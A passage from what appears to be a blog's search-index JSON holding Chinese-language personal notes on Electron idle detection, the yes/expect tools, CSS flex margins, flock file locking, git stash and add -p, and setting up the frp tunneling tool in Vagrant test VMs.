serve:electron\">\n</li>\n</ol>\n<p>最後，就能順利使用<code>require(&#39;winapi&#39;).GetLastInputInfo</code>函式<br>他會得到很多秒數</p>\n<p>另外<br>有爬到另一個別人寫好整合<br>他也包含MAC,Linux,Window 簡稱<code>idle time</code>(不知道是不是閒置時間意思??)<br><a href=\"https://www.npmjs.com/package/desktop-idle\" target=\"_blank\" rel=\"noopener\">desktop-idle - npm</a><br>安裝下去使用不需設定index.js<br>而且他的秒數比較直覺<br>後來就用這個函式庫</p>\n<p>其他資訊:<br><a href=\"http://sj82516-blog.logdown.com/posts/3903966/from-libuv-v8-to-nodejs-series-libuv-environment-setting-and-description\" target=\"_blank\" rel=\"noopener\">[從libuv/v8到nodejs 系列] ：Libuv - 環境建置與說明 « YJ Blog</a><br><a href=\"https://blog.csdn.net/chenhaifeng2016/article/details/75007006\" target=\"_blank\" rel=\"noopener\">Electron通过ffi调用DLL - 陈海峰的博客 - CSDN博客</a><br><a href=\"https://note.pcwu.net/2017/03/29/js-electron-nodejs-modules/\" target=\"_blank\" rel=\"noopener\">[Electron] 如何使用 Node.js 原生模組</a><br><a href=\"https://github.com/nodejs/node-gyp#installation\" target=\"_blank\" rel=\"noopener\">nodejs/node-gyp: Node.js native addon build tool</a></p>\n","categories":["electron"],"tags":["electron"]},{"title":"expect 和 yes 自動化工具","url":"/blog/2020/09/13/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/","content":"<p>最近看到有趣小工具<br>有點像 Linux 自動化工具<br>這邊小記一下</p>\n<a id=\"more\"></a>\n<h2 id=\"yes\"><a href=\"#yes\" class=\"headerlink\" title=\"yes\"></a>yes</h2><ul>\n<li><p><a href=\"https://unix.stackexchange.com/questions/102484/what-is-the-point-of-the-yes-command\" target=\"_blank\" rel=\"noopener\">utilities - What is the point of the <code>yes</code> command? - Unix &amp; Linux Stack Exchange</a></p>\n</li>\n<li><p><a href=\"https://www.howtoforge.com/linux-yes-command/\" target=\"_blank\" rel=\"noopener\">Linux yes Command Tutorial for Beginners (with Examples)</a></p>\n</li>\n</ul>\n<p>yes | rm -r large_directory</p>\n<p>yes | fsck /dev/foo</p>\n<h2 id=\"expect\"><a href=\"#expect\" class=\"headerlink\" title=\"expect\"></a>expect</h2><ul>\n<li><a href=\"https://www.cnblogs.com/lzrabbit/p/4298794.html\" target=\"_blank\" rel=\"noopener\">linux expect详解(ssh自动登录) - 懒惰的肥兔 - 博客园</a></li>\n</ul>\n<p>也有查 window 能跑 expect 方法</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/feipeng8848/p/8559773.html\" target=\"_blank\" rel=\"noopener\">Windows上安装配置SSH教程（5）——win10下使用Cygwin+Expect自动登陆ssh - feipeng8848 - 博客园</a></li>\n</ul>\n<p>原本想簡單使用，但後來最近發太多文章<br>然後目前這個應該還用不太到<br>有用過再紀錄</p>\n<p>不過自動化學習工具應該使用 Ansible 感覺會比較好</p>\n","categories":["Linux"],"tags":["expect","yes"]},{"title":"flex margin-right:auto 右邊元素靠右(參考bootstrap4 navbar)","url":"/blog/2018/07/02/flex-margin-right-auto-%E5%8F%B3%E9%82%8A%E5%85%83%E7%B4%A0%E9%9D%A0%E5%8F%B3-%E5%8F%83%E8%80%83bootstrap4-navbar/","content":"<p>今天看到官網Bootstrap 4的Nabars，好奇他的Navbar怎麼排版的<br>發現竟然是使用flex去編排，但是搜尋位置竟然可以靠右<br>中間空白是怎麼用的??查了一下，發現他有使用margin<br>究竟flex和margin碰在一起會產生甚麼化學反應呢?<br>讓我們紀錄吧!!!</p>\n<a id=\"more\"></a>\n<p>在講flex之前，我就有紀錄過margin搭配position可以置中，但其他是有公式的</p>\n<blockquote>\n<p>‘margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ +’border-right-width’ + ‘margin-right’ = width of containing block<br><a href=\"https://segmentfault.com/q/1010000008431088/a-1020000008431730\" target=\"_blank\" rel=\"noopener\">margin-left: auto;为什么可以使的元素靠右 - SharkU的回答 - SegmentFault 思否</a></p>\n</blockquote>\n<blockquote>\n<p>margin-right 不设置的话默认是0，width 定宽之后，margin-left取值为 auto ，自动占据了剩余的全部宽度，具体见 《css权威指南》 P170<br><a href=\"https://github.com/threerocks/studyFiles/blob/master/%E5%89%8D%E7%AB%AF/CSS%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%EF%BC%88%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%89(jb51.net\" target=\"_blank\" rel=\"noopener\">studyFiles/CSS权威指南（第三版）(jb51.net).pdf at master · threerocks/studyFiles</a>.pdf)</p>\n</blockquote>\n<p>bootstrap 4 是用 左邊最後一個元素加上<code>margin-right:auto</code> 右邊會靠右<br>當然反過來也可以在左邊search 加上<code>margin-left:auto</code></p>\n<p>在簡書看到我想知道的東西(備份:<a href=\"https://screenshots.firefox.com/0gK3HJq4OS6WkyCk/www.jianshu.com\" target=\"_blank\" rel=\"noopener\">https://screenshots.firefox.com/0gK3HJq4OS6WkyCk/www.jianshu.com</a>)</p>\n<blockquote>\n<p>Flex布局算法中对auto margins的对齐原理有如下解释，原文是英文，我尽量准确翻译：<br>    在主轴（main axis）方向<br>        如剩余空间为正数，则剩余空间会被平均分配在拥有主轴方向auto margin(s)的flex元素之间。<br>        如剩余空间为负数，则将主轴方向的auto margin(s)设定为‘0’。</p>\n</blockquote>\n<blockquote>\n<p>看过这些例图，auto margins的使用方法应该不会忘了吧。最后再来提个醒儿：</p>\n<ul>\n<li>auto margins仅针对当前的flex item，对其子元素无效。</li>\n<li>在计算flex-bases与flexible lengths （main size与cross size）时，auto margins取值为0。</li>\n<li>auto margins优先于justify-content与align-self。由于相应方向上的剩余空间已分配给auto margins，justify-content与align-self将无效。</li>\n<li>auto margins对溢出的（overflowing）flex item无效。</li>\n</ul>\n</blockquote>\n<p>作者：蜂蜜柚子茶<br>链接：<a href=\"https://www.jianshu.com/p/beeb93a76830\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/beeb93a76830</a><br>來源：简书</p>\n<p>沒想到還能這樣用，筆記筆記…</p>\n","categories":["CSS"],"tags":["CSS","flex","margin"]},{"title":"flex 重直置中 內容大於畫面，上面被截掉解決方法","url":"/blog/2018/10/25/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%EF%BC%8C%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/","content":"<p>之前寫程式發現用flex垂直至中超出畫面會有問題<br>一直以為都是用flex這個缺點不能用在大畫面上面<br>不過今天網路上找到兩個答案<br>簡單紀錄</p>\n<a id=\"more\"></a>\n<h2 id=\"unsafe\"><a href=\"#unsafe\" class=\"headerlink\" title=\"unsafe\"></a>unsafe</h2><p>justify-content: safe center<br>align-self: safe center</p>\n<p>目前只有Firefox 63支援<br>最近才到63XD</p>\n<h2 id=\"子項目家margin-auto\"><a href=\"#子項目家margin-auto\" class=\"headerlink\" title=\"子項目家margin:auto\"></a>子項目家margin:auto</h2><p>很神奇的margin</p>\n<p>可以直接用開發者工具去改<a href=\"http://zh-tw.learnlayout.com/flexbox.html\" target=\"_blank\" rel=\"noopener\">CSS - flexbox</a><br>有點懶截圖</p>\n<p>參考來源:<br><a href=\"https://stackoverflow.com/questions/33454533/cant-scroll-to-top-of-flex-item-that-is-overflowing-container\" target=\"_blank\" rel=\"noopener\">html - Can’t scroll to top of flex item that is overflowing container - Stack Overflow</a></p>\n","categories":["CSS"],"tags":["flex","css"]},{"title":"elementary OS更換Terminal字形 & 設定zsh環境變數","url":"/blog/2018/08/26/elementary-OS%E6%9B%B4%E6%8F%9BTerminal%E5%AD%97%E5%BD%A2-%E8%A8%AD%E5%AE%9Azsh%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/","content":"<p>To change font in the Terminal you need dconf-editor. Install it, if you haven’t done so:</p>\n<p>sudo apt-get install dconf-tools</p>\n<p>Run it and go to path org &gt; gnome &gt; desktop &gt; interface &gt; monospace-font-name. </p>\n<p><a href=\"https://www.facebook.com/groups/199493136812961/permalink/1544001102362151/?__xts__%5B0%5D=68.ARC1KrGOX9zJkDFN4oR8J3H5qUpRcg4qwmQqIuL9msps-za6SyHMsgZJBkwg5PyLQVaSV5S9sIzyG5WI982VuimrBiaxzKkLE88JdlPNUY1UQSfEt2d1yeNj2_rXMCr2zrN8ODo&amp;__tn__=-R\" target=\"_blank\" rel=\"noopener\">FB</a><br><a href=\"https://elementaryos.stackexchange.com/questions/1149/how-can-i-change-the-default-terminal-font/1153#1153\" target=\"_blank\" rel=\"noopener\">themes - How can I change the default Terminal font? - elementary OS Stack Exchange</a></p>\n<p>.zshrc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">下面修改环境变量，将~/.composer/vendor/bin写入 PATH 环境变量里。</span><br><span class=\"line\"></span><br><span class=\"line\">注意： 如果你的命令行安装了zsh和oh-my-zsh，修改环境变量时有些小的变化。</span><br><span class=\"line\"></span><br><span class=\"line\">我遇到的就是这个问题，怎么修改，环境变量都不生效，比如我修改的是~/.bash_profile，那么必须`source</span><br><span class=\"line\">~/.bash_profile`才能生效，而且重启后继续无效，为什么呢？因为 zsh ！我的终端是</span><br><span class=\"line\">iTerm2，它很炫酷，但是就是环境变量搞不成。Google 找到了问题所在，安装 zsh</span><br><span class=\"line\">后，~/.bash_profile并没有被执行，所以需要编辑 zsh 的配置文件~/.zshrc，在该文件里加入</span><br><span class=\"line\"></span><br><span class=\"line\">source ~/.bash_profile 现在我们应该可以用homestead命令了。</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://segmentfault.com/q/1010000004376181/a-1020000004377872\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/q/1010000004376181/a-1020000004377872</a></p>\n<p>發現這篇很久沒補<br>就先寫重點吧…</p>\n","categories":["Linux"],"tags":["Linux"]},{"title":"flock 防止重新執行方法","url":"/blog/2019/08/19/flock-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/","content":"<p>印象中以前寫 PHP 有用過 flock<br>但這只用在簡單 PHP 上面<br>最近看到flock指令<br>突然想啟以前寫 PHP<br>有用過這個</p>\n<a id=\"more\"></a>\n<p><a href=\"https://rpubs.com/wush978/flock\" target=\"_blank\" rel=\"noopener\">RPubs - Linux 小撇步：利用flock來做同步和非同步應用</a> <a href=\"/blog/2019/08/19/flock-防止重新執行方法/web3.png\" title=\"備份圖\">備份圖</a></p>\n<p>裡面有提到flock 基本用法<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\">sleep 10</span><br><span class=\"line\">date</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>儲存成test.sh並且打開執行權限（chmod 700 test.sh）<br>此時如果我們打開兩個shell, 並且約同時執行：</p>\n</blockquote>\n<blockquote>\n<p>flock /tmp/demo.lock /tmp/test.sh</p>\n</blockquote>\n<p>簡單測試用兩個command line 測試<br>但我還不確定有沒有照順序執行</p>\n<p>我有簡單開三個command line 測試<br>確定不會照順序執行</p>\n<p>flock 預設為<code>-x</code> </p>\n<p><code>-c</code> 後面下 command line，通常放在最後面</p>\n<p><code>-x</code> exclusive lock</p>\n<p><code>-s</code> shared lock</p>\n<p><code>-n</code> or <code>-xn</code> or <code>-sn</code><br><del>當下有執行程式(錯誤說法)</del>，不會執行程式</p>\n<p>有趣的xxx.lock檔案一直都會在!!!</p>\n<p>簡單來說就是當 shared lock，別的程式 (shared lock) 還是能執行，但是 exclusive lock 不行<br>反之<br>當 exclusive lock 程式執行， shared lock 和 exclusive lock 都不能執行!!!</p>\n<p>可以開三個 command line 玩玩看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flock -s  /tmp/demo.lock /tmp/test.sh</span><br><span class=\"line\">flock -x  /tmp/demo.lock /tmp/test.sh</span><br><span class=\"line\">flock -sn  /tmp/demo.lock /tmp/test.sh</span><br><span class=\"line\">flock -xn  /tmp/demo.lock /tmp/test.sh</span><br></pre></td></tr></table></figure>\n<h2 id=\"linux-lock-種類\"><a href=\"#linux-lock-種類\" class=\"headerlink\" title=\"linux lock 種類\"></a>linux lock 種類</h2><ul>\n<li><p>shared lock</p>\n</li>\n<li><p>exclusive lock</p>\n</li>\n</ul>\n<blockquote>\n<p>同時持有一個shared lock的process數量並沒有限制. 但同時只有一個process有exclusive lock.(Exclusive lock會拒絕其他shared lock和exclusive lock)<br>無論process對於檔案的存取方式為何(R/W, ReadOnly, WriteOnll), 都可以使用flock()對檔案加上shared lock或exclusive lock<br>shared lock跟exclusive lock可以互相轉換. 但轉換的過程不是atomic的. 轉換的步驟是先移除舊的鎖然後建立新的鎖. 中間若有另一個新鎖上去, 轉換過程就會發生失敗並且失去原本的鎖。<br>再將shared lock轉成exclusive lock的過程中. 若有另一個process持有相同的shared lock, 那他就會被blocking, 除非他有設置LOCK_NB</p>\n</blockquote>\n<p>參考: <a href=\"http://objectaline19.blogspot.com/2017/03/linux-file-locking.html\" target=\"_blank\" rel=\"noopener\">CODING IS ART: Linux 檔案鎖(File Locking)</a> <a href=\"/blog/2019/08/19/flock-防止重新執行方法/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>我覺得善用這個特性，寫排成會非常方便<br>印象中有看過程式適用<code>ps</code>去看關鍵字找東西<br>但透過這個真的會很方便，又不用寫程式!!!</p>\n<p>更多設定方法可參考 <a href=\"https://blog.gtwang.org/linux/prevent-shell-script-duplicate-executions/\" target=\"_blank\" rel=\"noopener\">Linux 防止 Shell 指令稿重複執行教學 - G. T. Wang</a> <a href=\"/blog/2019/08/19/flock-防止重新執行方法/web2.png\" title=\"備份圖\">備份圖</a></p>\n<p><strong>2019-10-01</strong><br>找到查看 lock 檔案方法<br><a href=\"https://ephrain.net/linux-%E4%BD%BF%E7%94%A8-lsof-lslocks-fuser-%E6%8C%87%E4%BB%A4%E5%88%97%E5%87%BA%E7%9B%AE%E5%89%8D%E9%8E%96%E5%AE%9A%E4%B8%AD%E7%9A%84-file-locks/\" target=\"_blank\" rel=\"noopener\">[Linux] 使用 lsof, lslocks, fuser 指令列出目前鎖定中的 file locks | EPH 的程式日記</a><br><a href=\"https://unix.stackexchange.com/questions/85994/how-to-list-processes-locking-file\" target=\"_blank\" rel=\"noopener\">process - How to list processes locking file? - Unix &amp; Linux Stack Exchange</a></p>\n<p><strong>2019-10-26</strong></p>\n<p>最近上了 Swoole 課程<br>最近用 rclone 寫 tranmission 腳本<br>使用 flock 防止重覆執行<br>沒有預到問題<br>但最近我也觀查到 rclone 上傳的時候<br><del>會開很多<code>子程序</code></del> 結果是執行緒<br><del>但我沒有預到什麼問題</del> 結果是執行緒 😜</p>\n<p>在上 swoole 裡面有提到子程序 fork 主程序<br>這時候主程序會跟子程序變數做隔離<br><del>但我很好奇 flock 竟然能讓子程序繼續運作</del> 結果是執行緒 🤷‍<br>但我覺得 flock 沒辦法測試子程序執行狀況，畢竟是用 flock 指令</p>\n<p>上面再搞笑 orz，還好有翻到這篇<br>補充一下， n 個 thread 都在同一個 process<br>所以算同一個程序，應該不會有 lock 問題<br>剛剛看到<a href=\"https://ithelp.ithome.com.tw/questions/10194441?sc=rss.qu\" target=\"_blank\" rel=\"noopener\">Ununtu htop - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br><del>瞬間被打臉</del>，原來綠色不是子程序，但為什麼會有獨立的 PID?</p>\n<blockquote>\n<p>綠色字的是 Thread ，你可以在 Setup -&gt; Display options -&gt; Hide userland process thread 選項做調整，看你要不要顯示<br>另外你也可以按 F5 切換 Tree view ，這樣就可以明確的看出來那些綠字的 thread 是屬於哪個 process 的</p>\n</blockquote>\n<p>最後有看到比較詳細的介紹<a href=\"https://medium.com/@petertc/thread-and-signal-in-linux-4f2038d18fd\" target=\"_blank\" rel=\"noopener\">[筆記]Linux的thread和signal - petertc - Medium</a> <a href=\"/blog/2019/08/19/flock-防止重新執行方法/web4.png\" title=\"備份圖\">備份圖</a></p>\n<blockquote>\n<p>同process的thread會有相同的process id，且個別有thread id。對於multithread的process，process id又稱為thread group id<br>…<br>圖中Command欄位是綠色代表這是一個thread，其PID欄位值其實是thread id。圖中ipython共有有三個thread（一個leader, 兩個member）</p>\n</blockquote>\n<p>原來是我誤會大了!!難怪怎麼對 thread 做 kill 沒有效果<br>更多 process 介紹可以看這篇<a href=\"https://medium.com/@petertc/session-process-group-and-signal-in-linux-7fbe85c0b0c5\" target=\"_blank\" rel=\"noopener\">[筆記]Linux的process和signal - petertc - Medium</a></p>\n<p>因為我在 Raspberry PI 觀察<br><a href=\"https://ephrain.net/linux-%E4%BD%BF%E7%94%A8-lsof-lslocks-fuser-%E6%8C%87%E4%BB%A4%E5%88%97%E5%87%BA%E7%9B%AE%E5%89%8D%E9%8E%96%E5%AE%9A%E4%B8%AD%E7%9A%84-file-locks/\" target=\"_blank\" rel=\"noopener\">[Linux] 使用 lsof, lslocks, fuser 指令列出目前鎖定中的 file locks | EPH 的程式日記</a><br>預設沒有使用 lsof 所以就不測試了<br>lslock<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">COMMAND           PID  TYPE SIZE MODE  M START END PATH</span><br><span class=\"line\">cron              304 FLOCK      WRITE 0     0   0 /run...</span><br><span class=\"line\">flock           17094 FLOCK      WRITE 0     0   0 /...</span><br><span class=\"line\">(unknown)         278 FLOCK      WRITE 0     0   0 /run...</span><br><span class=\"line\">(unknown)         281 FLOCK      WRITE 0     0   0 /run...</span><br></pre></td></tr></table></figure></p>\n<p>不知道我的 PI 怎麼了orz<br>PATH 看不到</p>\n<p>sudo fuser 可以看到 lock 檔案<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ sudo fuser /tmp/rclone.lock</span><br><span class=\"line\">/tmp/rclone.lock:    17094 17095</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://gist.github.com/beyu/462241bd73ae630cd7ee937a90766046\" target=\"_blank\" rel=\"noopener\">flockを孫プロセスに保持させてプロセスの終了までロックを無理やり保持する</a> 不知道這是什麼?先留一下</p>\n","categories":["Linux"],"tags":["linux","flock"]},{"title":"git commit 指定幾行 & git stash 查看差異內容","url":"/blog/2018/11/14/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/","content":"<p>最近使用Socuretree，發現大部分功能都看懂了<br><a href=\"https://chocolatey.org/packages/SourceTree\" target=\"_blank\" rel=\"noopener\">Chocolatey Gallery | Sourcetree for Windows Enterprise 3.0.8</a><br>但是我發現stash，可以看到裡面存甚麼東西<br>Sourcetree還有git add 指定行數到index<br>這個看起來很方便<br>不知道原生怎麼處理<br>這邊筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"git-add-p\"><a href=\"#git-add-p\" class=\"headerlink\" title=\"git add -p\"></a>git add -p</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># To remove &apos;-&apos; lines, make them &apos; &apos; lines (context).</span><br><span class=\"line\"># To remove &apos;+&apos; lines, delete them.</span><br><span class=\"line\"># Lines starting with # will be removed</span><br></pre></td></tr></table></figure>\n<p>簡單來說<br>‘+’不想被add進去，要移除單行內容(如:vi dd)<br>‘-‘不想被add進去，要取代’ ‘(空白)(如:vi r 空白)</p>\n<h2 id=\"git-stash-show-p\"><a href=\"#git-stash-show-p\" class=\"headerlink\" title=\"git stash show -p\"></a>git stash show -p</h2><p><a href=\"https://stackoverflow.com/questions/7677736/git-diff-against-a-stash\" target=\"_blank\" rel=\"noopener\">Git diff against a stash - Stack Overflow</a></p>\n<p>這樣就能看到差異了</p>\n<p>其實Sourcetree也真的算滿方便的東西<br>雖然之前用小烏龜，看log都很方便用了</p>\n<h2 id=\"番外vim筆記-單行上移-下移-方法\"><a href=\"#番外vim筆記-單行上移-下移-方法\" class=\"headerlink\" title=\"番外vim筆記(單行上移/下移)方法\"></a>番外vim筆記(單行上移/下移)方法</h2><p>:m+ = 把目前這一行往下移動一行<br>:m-2 = 把目前這一行往上移動一行<br><a href=\"https://kaochenlong.com/2011/12/28/vim-tips/\" target=\"_blank\" rel=\"noopener\">Vim的操作小技巧 | 高見龍</a><br>或者<br>ddkP  刪除單行 + 貼上  </p>\n<p><a href=\"https://www.v2ex.com/t/49043\" target=\"_blank\" rel=\"noopener\">请问vim如何移动当前行向上或向下？不用选中 - V2EX</a></p>\n<p>多行我就沒有測試了<br><a href=\"https://jackxiang.com/post/5113/\" target=\"_blank\" rel=\"noopener\">[实践OK]vi行移动：vim上下移动一行或一段代码，及回到最近修改位置的vim快捷键，回到倒数第二次修改的位置，vim一下知道所在行的函数名设置方法。在文件中快速查找光标处一样的单词。 - 向东博客 专注WEB应用 构架之美 — 构架之美，在于尽态极妍 | 应用之美，在于药到病除 - 赢在IT，Playin’ with IT,Focus on Killer Application,Marketing Meets Technology.</a><br><a href=\"http://hant.ask.helplib.com/vim/post_199787\" target=\"_blank\" rel=\"noopener\">在Vim，整行上下移动<em>vim</em>帮酷编程问答</a></p>\n<p>最近為了<code>git rebase</code>，發現vim不會上移一行….<br>特別找了一下</p>\n<p><a href=\"https://kaochenlong.com/2011/12/26/vim/\" target=\"_blank\" rel=\"noopener\">Vim | 高見龍</a><br><a href=\"https://kaochenlong.com/2012/06/01/screencast-3-vim-plugins/\" target=\"_blank\" rel=\"noopener\">爽爽快快學Vim(3) - Vim Plugins | 高見龍</a></p>\n<h2 id=\"stash-apply\"><a href=\"#stash-apply\" class=\"headerlink\" title=\"stash apply\"></a>stash apply</h2><blockquote>\n<p>要把 Stash 撿回來用，除了 pop 之外，另一個指令是 apply：</p>\n<p>$ git stash apply stash@{0}</p>\n<p>這是指會把 stash@{0} 這個 Stash 拿來套用在現在的分支上，但 Stash 不會刪除，還是會留在 Stash 列表上。所以你可把 pop 指令看成「apply Stash + drop Stash」。</p>\n</blockquote>\n<p>參考:<a href=\"https://gitbook.tw/chapters/faq/stash.html\" target=\"_blank\" rel=\"noopener\">【狀況題】手邊的工作做到一半，臨時要切換到別的任務 - 為你自己學 Git | 高見龍</a></p>\n<h2 id=\"重新上-remote-新的分支\"><a href=\"#重新上-remote-新的分支\" class=\"headerlink\" title=\"重新上 remote 新的分支\"></a>重新上 remote 新的分支</h2><p>最近分支命名錯誤，重新修改本地端分支名字<br><code>git branch -m [ branc_name ]</code><br>發現 <code>git push</code> 上到 remote 還是舊的名稱上面<br>原因是 <code>--set-upstream</code> 已經設定過了<br>必須重新修正<br><code>git push -u [remote name] [branch name]</code><br>可以下指令</p>\n<blockquote>\n<p>git push -u github master 指令可以拆解成以下的指令</p>\n<p>$ git push github master<br>$ git checkout master<br>$ git branch -u github/master</p>\n</blockquote>\n<h2 id=\"取消-remote-branch-追蹤\"><a href=\"#取消-remote-branch-追蹤\" class=\"headerlink\" title=\"取消 remote branch 追蹤\"></a>取消 remote branch 追蹤</h2><p>git branch –unset-upstream</p>\n<p>取消當前分支</p>\n<p>git branch –unset-upstream master  </p>\n<p>也能指定分支</p>\n","categories":["Git"],"tags":["git","git stash"]},{"title":"frp 內網穿透使用筆記","url":"/blog/2020/11/15/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","content":"<p>最近看 frp 文章<br>我看反向代理不用設定在 server 那邊<br>這邊方法有點跟 traefik 跟 label 實作有點像<br>但網路上說這兩個用途有點不太一樣<br>我認真看一下 frp 官網文件<br>真的還是有差!!</p>\n<a id=\"more\"></a>\n<p>frp 目前我看沒法跟 traefik 抓 docker label 去做自動代理動作<br>frp, traefik 都可以做 tcp, http 反向代理(聽說前幾版 traefik 不支援 tcp 代理)</p>\n<p>這邊來看，traefik 功能實用信應該大於 frp<br>但看一下細節功能還是不一樣</p>\n<p>frp 可以做 stcp(類似ssh tunnel) 連線，這邊 traefik 目前沒有這個東西<br>xtcp, unix socket …等等代理方法，這些 traefik 目前沒有這些</p>\n<h2 id=\"frp-環境建置\"><a href=\"#frp-環境建置\" class=\"headerlink\" title=\"frp 環境建置\"></a>frp 環境建置</h2><p>這邊我就簡單用 Vagrant 建置幾個 VM 環境<br><a href=\"https://malagege.github.io/blog/2020/03/07/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/\">檢查大量不同 IP 跟 Port 方法 | 程式狂想筆記</a><br>這邊之前有寫過<br>這邊從這邊簡單複製過來改</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vagrant.configure(<span class=\"string\">\"2\"</span>) <span class=\"keyword\">do</span> <span class=\"params\">|config|</span></span><br><span class=\"line\">  config.vm.provision <span class=\"string\">\"shell\"</span>, <span class=\"symbol\">inline:</span> <span class=\"string\">\"echo Hello\"</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  config.vm.define <span class=\"string\">\"frp-server\"</span> <span class=\"keyword\">do</span> <span class=\"params\">|web|</span></span><br><span class=\"line\">    web.vm.box = <span class=\"string\">\"ubuntu/xenial64\"</span></span><br><span class=\"line\">    web.vm.network <span class=\"string\">\"private_network\"</span>, <span class=\"symbol\">ip:</span> <span class=\"string\">\"192.168.50.2\"</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  config.vm.define <span class=\"string\">\"frp-client1\"</span> <span class=\"keyword\">do</span> <span class=\"params\">|db|</span></span><br><span class=\"line\">    db.vm.box = <span class=\"string\">\"ubuntu/xenial64\"</span></span><br><span class=\"line\">    db.vm.network <span class=\"string\">\"private_network\"</span>, <span class=\"symbol\">ip:</span> <span class=\"string\">\"192.168.50.4\"</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"comment\"># 其實我發現可以不用開很多 VM</span></span><br><span class=\"line\"><span class=\"comment\"># 可以用 tmux 多開 frpc ，假如要模擬測試多台連，可以用這個</span></span><br><span class=\"line\"><span class=\"comment\">#   config.vm.define \"frp-client2\" do |db|</span></span><br><span class=\"line\"><span class=\"comment\">#     db.vm.box = \"ubuntu/xenial64\"</span></span><br><span class=\"line\"><span class=\"comment\">#     db.vm.network \"private_network\", ip: \"192.168.50.5\"</span></span><br><span class=\"line\"><span class=\"comment\">#   end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#   config.vm.define \"frp-client3\" do |db|</span></span><br><span class=\"line\"><span class=\"comment\">#     db.vm.box = \"ubuntu/xenial64\"</span></span><br><span class=\"line\"><span class=\"comment\">#     db.vm.network \"private_network\", ip: \"192.168.50.6\"</span></span><br><span class=\"line\"><span class=\"comment\">#   end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#   config.vm.define \"frp-client4\" do |db|</span></span><br><span class=\"line\"><span class=\"comment\">#     db.vm.box = \"ubuntu/xenial64\"</span></span><br><span class=\"line\"><span class=\"comment\">#     db.vm.network \"private_network\", ip: \"192.168.50.3\"</span></span><br><span class=\"line\"><span class=\"comment\">#   end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n<p>vagrant up 會等機器開好</p>\n<h2 id=\"frp-安裝教學\"><a href=\"#frp-安裝教學\" class=\"headerlink\" title=\"frp 安裝教學\"></a>frp 安裝教學</h2><p>參考:<a href=\"https://canwdev.github.io/manual/setup-frp.html\" target=\"_blank\" rel=\"noopener\">安装 frp 内网穿透工具 | 离线笔记 · OfflineNotes</a></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/fatedier/frp/releases/download/v0.34.2/frp_0.34.2_linux_amd64.tar.gz</span><br><span class=\"line\">tar xzvf frp_0.34.2_linux_amd64.tar.gz</span><br><span class=\"line\">mv frp_0.34.2_linux_amd64 frp</span><br></pre></td></tr></table></figure>\n<p>這段看要不要在本機做或在 VM 做都可以<br>VM 記得要切到<code>/vagrant</code> 這邊做<br>這樣其他機器就不用再抓一次了</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">bind_port</span> = <span class=\"number\">7000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">dashboard_addr</span> = <span class=\"number\">0.0</span>.<span class=\"number\">0.0</span> # 正式不要開</span><br><span class=\"line\"><span class=\"attr\">dashboard_port</span> = <span class=\"number\">7500</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 仪表盘访问的用户名密码，如果不设置，则默认都是 admin</span></span><br><span class=\"line\"><span class=\"attr\">dashboard_user</span> = admin</span><br><span class=\"line\"><span class=\"attr\">dashboard_pwd</span> = admin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># auth token</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = abcd1234567890</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># VM frp-server 可以使用 tmux </span></span><br><span class=\"line\">vagrant ssh frp-server</span><br><span class=\"line\"><span 